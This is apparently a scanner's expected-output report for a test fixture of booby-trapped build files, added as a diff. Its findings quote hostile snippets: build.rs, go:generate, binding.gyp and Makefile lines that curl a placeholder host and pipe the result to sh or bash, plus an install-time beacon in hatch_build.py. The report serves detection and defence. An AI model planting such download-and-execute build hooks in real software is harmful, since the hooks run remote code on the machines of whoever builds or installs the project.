@@ -1,0 +1,242 @@
+{
+  "findings": [
+    {
+      "file": "binding.gyp",
+      "line": 1,
+      "meaning": "Runs whatever a remote server returns, with no review.",
+      "remediation": "pin a version and verify a checksum; avoid `curl \u2026 | sh` in install hooks and scripts",
+      "rule": "Download-and-execute",
+      "severity": "high",
+      "snippet": "{ \"targets\": [ { \"target_name\": \"addon\", \"actions\": [ { \"action_name\": \"pre\", \"inputs\": [], \"outputs\": [\"x\"], \"action\": [\"sh\", \"-c\", \"curl https://x.example.inv",
+      "title": "Download-and-execute (pipe to shell)",
+      "tool": "agent-checks"
+    },
+    {
+      "file": "build.rs",
+      "line": 2,
+      "meaning": "Runs whatever a remote server returns, with no review.",
+      "remediation": "pin a version and verify a checksum; avoid `curl \u2026 | sh` in install hooks and scripts",
+      "rule": "Download-and-execute",
+      "severity": "high",
+      "snippet": "fn main() { Command::new(\"sh\").arg(\"-c\").arg(\"curl https://x.example.invalid/b | sh\").status().unwrap(); }",
+      "title": "Download-and-execute (pipe to shell)",
+      "tool": "agent-checks"
+    },
+    {
+      "file": "cmd/gen.go",
+      "line": 3,
+      "meaning": "Runs whatever a remote server returns, with no review.",
+      "remediation": "pin a version and verify a checksum; avoid `curl \u2026 | sh` in install hooks and scripts",
+      "rule": "Download-and-execute",
+      "severity": "high",
+      "snippet": "//go:generate sh -c \"curl -s https://x.example.invalid/g.sh | bash\"",
+      "title": "Download-and-execute (pipe to shell)",
+      "tool": "agent-checks"
+    },
+    {
+      "file": "cmd/gen.go",
+      "line": 3,
+      "meaning": "Runs on `go generate`; often wired into build instructions.",
+      "remediation": "vendor the generated output or make the fetch reproducible (pin a version/checksum)",
+      "rule": "go-generate-fetch",
+      "severity": "high",
+      "snippet": "//go:generate sh -c \"curl -s https://x.example.invalid/g.sh | bash\"",
+      "title": "go-generate-fetch: go:generate downloads or runs a shell",
+      "tool": "agent-checks"
+    },
+    {
+      "file": "hatch_build.py",
+      "line": 1,
+      "meaning": "Runs during pip install/build of this source.",
+      "remediation": "vendor the artifact into the repo, or make the build step explicit and reproducible",
+      "rule": "install-time-fetch",
+      "severity": "high",
+      "snippet": "import urllib.request",
+      "title": "install-time-fetch: build script runs commands / network at install time",
+      "tool": "agent-checks"
+    },
+    {
+      "file": "hatch_build.py",
+      "line": 2,
+      "meaning": "Runs during pip install/build of this source.",
+      "remediation": "vendor the artifact into the repo, or make the build step explicit and reproducible",
+      "rule": "install-time-fetch",
+      "severity": "high",
+      "snippet": "urllib.request.urlopen(\"https://x.example.invalid/beacon\")",
+      "title": "install-time-fetch: build script runs commands / network at install time",
+      "tool": "agent-checks"
+    },
+    {
+      "file": "setup.cfg",
+      "line": 3,
+      "meaning": "Runs during pip install/build of this source.",
+      "remediation": "vendor the artifact into the repo, or make the build step explicit and reproducible",
+      "rule": "install-time-fetch",
+      "severity": "high",
+      "snippet": "# build helper: subprocess.call([\"sh\", \"fetch.sh\"])",
+      "title": "install-time-fetch: build script runs commands / network at install time",
+      "tool": "agent-checks"
+    },
+    {
+      "file": "Makefile",
+      "line": 2,
+      "meaning": "Runs if you invoke make/just; review before building.",
+      "remediation": "review the Make/just recipe; build targets should build, not download or open sockets",
+      "rule": "make-just-hooks",
+      "severity": "low",
+      "snippet": "curl -s https://x.example.invalid/m | base64 -d > tool",
+      "title": "make-just-hooks: Make/just target downloads, decodes or opens sockets",
+      "tool": "agent-checks"
+    },
+    {
+      "file": "binding.gyp",
+      "line": 1,
+      "meaning": "Executed by node-gyp during `npm install` of native addons.",
+      "remediation": "review the build script/backend; it runs at install or build time",
+      "rule": "node-gyp-action",
+      "severity": "medium",
+      "snippet": "{ \"targets\": [ { \"target_name\": \"addon\", \"actions\": [ { \"action_name\": \"pre\", \"inputs\": [], \"outputs\": [\"x\"], \"action\": [\"sh\", \"-c\", \"curl https://x.example.inv",
+      "title": "node-gyp-action: node-gyp action runs a command at build",
+      "tool": "agent-checks"
+    },
+    {
+      "file": "pyproject.toml",
+      "line": 3,
+      "meaning": "An unknown PEP 517 backend runs arbitrary code on pip install.",
+      "remediation": "review the build script/backend; it runs at install or build time",
+      "rule": "pip-build-hook",
+      "severity": "medium",
+      "snippet": "build-backend = \"evilbuild.api",
+      "title": "pip-build-hook: non-standard build backend",
+      "tool": "agent-checks"
+    },
+    {
+      "file": "build.rs",
+      "line": 2,
+      "meaning": "build.rs executes on `cargo build` with your permissions.",
+      "remediation": "review the build script/backend; it runs at install or build time",
+      "rule": "rust-build-rs",
+      "severity": "medium",
+      "snippet": "fn main() { Command::new(\"sh\").arg(\"-c\").arg(\"curl https://x.example.invalid/b | sh\").status().unwrap(); }",
+      "title": "rust-build-rs: Cargo build script runs commands / network",
+      "tool": "agent-checks"
+    },
+    {
+      "file": "(repo)",
+      "line": 0,
+      "meaning": "The repo collects/transmits data but ships no privacy policy/manifest file.",
+      "remediation": "add a PRIVACY.md/policy (or link one) and state what is collected",
+      "rule": "privacy-doc",
+      "severity": "low",
+      "snippet": "expected PRIVACY.md or PrivacyInfo.xcprivacy",
+      "title": "privacy-doc: no privacy policy file",
+      "tool": "privacy"
+    },
+    {
+      "file": "hatch_build.py",
+      "line": 2,
+      "meaning": "Network call at module scope: importing this library already contacts a server, before you call anything.",
+      "remediation": "move the side effect out of module scope or gate it behind a flag",
+      "rule": "import-time-network",
+      "severity": "medium",
+      "snippet": "urllib.request.urlopen(\"https://x.example.invalid/beacon\")",
+      "title": "import-time-network: python module scope",
+      "tool": "privacy"
+    }
+  ],
+  "meta": {
+    "capabilities": {
+      "environment": [],
+      "files": 8,
+      "filesystem": [],
+      "network": [
+        {
+          "count": 2,
+          "doc": false,
+          "file": "build.rs",
+          "line": 2,
+          "source": "static",
+          "test": false,
+          "value": "x.example.invalid",
+          "verified": false
+        }
+      ],
+      "processes": [
+        {
+          "count": 1,
+          "doc": false,
+          "file": "build.rs",
+          "line": 2,
+          "source": "static",
+          "test": false,
+          "value": "command::new",
+          "verified": false
+        }
+      ],
+      "storage": []
+    },
+    "commit": null,
+    "complete": true,
+    "coverage": {
+      "bytes_scanned": 461,
+      "bytes_scanned_pct": 65.3,
+      "bytes_total": 706,
+      "files_scanned": 6,
+      "files_total": 8,
+      "languages": {
+        "inspected": {
+          "Go": 1,
+          "Python": 1,
+          "Rust": 1
+        },
+        "no_rules": {}
+      },
+      "skipped": {
+        "archive": 0,
+        "binary": 0,
+        "oversize": 0,
+        "unreadable": 0,
+        "unsupported": 2
+      },
+      "unscanned_extensions": [
+        [
+          "(none)",
+          1
+        ],
+        [
+          ".gyp",
+          1
+        ]
+      ]
+    },
+    "fetched_via": "local path (copied)",
+    "files": 8,
+    "mode": "local (no docker)",
+    "pii_redacted": true,
+    "privacy_mode": "full",
+    "privacy_profile": "Privacy profile: 0 tracker vendor(s), 0 third-party host(s), 0 PII item(s)",
+    "privacy_summary": {
+      "network": [
+        "python module scope"
+      ],
+      "transparency": [
+        "no privacy policy file"
+      ]
+    },
+    "profile": "balanced",
+    "ref": null,
+    "ruleset": "92559dde022f",
+    "suppressed": 0,
+    "suppressions": [],
+    "target": "tests/fixtures/trap-build"
+  },
+  "privacy_summary": {
+    "network": [
+      "python module scope"
+    ],
+    "transparency": [
+      "no privacy policy file"
+    ]
+  },
+  "version": "1.194.0"
+}
